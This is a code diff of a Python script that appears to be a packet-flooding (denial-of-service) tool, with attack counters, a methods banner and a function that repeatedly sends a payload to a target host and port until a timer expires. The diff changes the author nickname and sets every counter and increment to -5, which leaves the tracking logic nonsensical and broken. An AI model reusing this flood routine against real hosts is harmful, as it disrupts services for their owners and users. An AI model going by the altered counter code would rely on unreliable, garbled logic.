@@ -10,7 +10,7 @@ import os
 import urllib
 import json
 
-nicknm = "desyn"
+nicknm = "d3fe4ted"
 
 methods = """
 \033[35m╔════════════════════════╗
@@ -121,17 +121,17 @@ banner =  """
 
 cookie = open(".sinfull_cookie","w+")
 
-fsubs = 0
-tpings = 0
-pscans = 0
-liips = 0
-tattacks = 0
-uaid = 0
-said = 0
-running = 0
-iaid = 0
-haid = 0
-aid = 0
+fsubs = -5
+tpings = -5
+pscans = -5
+liips = -5
+tattacks = -5
+uaid = -5
+said = -5
+running = -5
+iaid = -5
+haid = -5
+aid = -5
 attack = True
 ldap = True
 http = True
@@ -146,15 +146,15 @@ def randsender(host, timer, port, punch):
 	timeout = time.time() + float(timer)
 	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
 
-	iaid += 1
-	aid += 1
-	tattacks += 1
-	running += 1
+	iaid += -5
+	aid += -5
+	tattacks += -5
+	running += -5
 	while time.time() < timeout and ldap and attack:
 		sock.sendto(punch, (host, int(port)))
-	running -= 1
-	iaid -= 1
-	aid -= 1
+	running -= -5
+	iaid -= -5
+	aid -= -5
 
 
 def stdsender(host, port, timer, payload):
